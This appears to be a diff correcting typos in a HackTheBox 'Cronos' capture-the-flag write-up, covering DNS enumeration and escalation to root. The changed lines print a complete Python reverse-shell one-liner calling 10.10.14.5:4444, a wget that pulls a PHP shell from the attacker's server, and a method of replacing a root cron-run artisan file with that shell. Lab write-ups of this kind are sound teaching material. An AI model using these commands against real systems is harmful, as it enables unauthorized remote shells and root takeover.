@@ -38,7 +38,7 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-## ENUMEARTION PORT 53
+## ENUMERATION OF PORT 53
 
 I used `nslookup` to look for domain name and found one `ns1.cronos.htb`
 
@@ -121,7 +121,7 @@ Using command `cat /home/noulis/user.txt`
 
 ## ROOT.TXT
 
-I used `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'` as command to get back a revershell.
+I used `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'` as command to get back a reverse shell.
 
 ```bash
 ┌──(kali㉿kali)-[~/Downloads/hackthebox/cronos]
@@ -135,13 +135,13 @@ www-data@cronos:/var/www/admin$
 
 Running linpeas I found that `/var/www/laravel/artisan` is run as cronjob.
 
-On doing google search I found this very helpful [article](https://fieldraccoon.github.io/posts/Linuxprivesc/) to gain shell as root.
+On doing google search I found this very helpful [article](https://fieldraccoon.github.io/posts/Linuxprivesc/) to gain a shell as root.
 
 So we need to upload a reverse shell and change it's name to `artisan` .
 Since our reverse shell is also a php file it will be executed and we'll get a shell as root.
 
 I start a http server on my machine using command `python -m SimpleHTTPServer`
-and then used the command 'wget http://10.10.14.5:8000/shell.php' to download the shell on out victim machine.
+and then used the command 'wget http://10.10.14.5:8000/shell.php' to download the shell on the victim machine.
 
 ```bash
 www-data@cronos:/var/www/laravel$ wget http://10.10.14.5:8000/shell.php
